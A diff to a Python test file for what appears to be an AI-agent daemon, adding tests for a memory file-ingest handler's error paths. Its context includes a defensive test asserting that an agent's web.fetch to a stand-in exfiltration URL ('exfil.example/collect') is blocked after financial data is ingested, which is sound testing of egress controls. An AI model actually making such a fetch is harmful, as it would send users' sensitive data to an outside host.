@@ -253,3 +253,30 @@ async def test_ingested_financial_data_cannot_egress(tmp_path: Path) -> None:
         s.id, "web.fetch", {"url": "http://exfil.example/collect?d=x"}
     )
     assert outcome.decision != Decision.ALLOW  # denied/gated after financial ingest
+
+
+@pytest.mark.asyncio
+async def test_ingest_error_paths(tmp_path: Path) -> None:
+    """Cover the ingest guard branches: missing file, oversized file, and the
+    no-fs-labeler / no-category path (value stored unlabeled)."""
+    from capabledeputy.daemon.memory_handlers import _INGEST_MAX_BYTES, make_memory_handlers
+
+    # No fs_labeler wired.
+    app = App(state_db_path=tmp_path / "s.db", audit_log_path=tmp_path / "a.jsonl")
+    await app.startup()
+    ingest = make_memory_handlers(app)["memory.ingest_file"]
+
+    missing = await ingest({"path": str(tmp_path / "nope.txt")})
+    assert missing["ok"] is False and "not a file" in missing["error"]
+
+    big = tmp_path / "big.txt"
+    big.write_text("x" * (_INGEST_MAX_BYTES + 10))
+    oversized = await ingest({"path": str(big)})
+    assert oversized["ok"] is False and "cap" in oversized["error"]
+
+    plain = tmp_path / "plain.txt"
+    plain.write_text("hello")
+    res = await ingest({"path": str(plain)})  # no fs_labeler, no category -> unlabeled
+    assert res["ok"] is True
+    assert res["categories"] == []
+    assert res["session_tainted"] is False
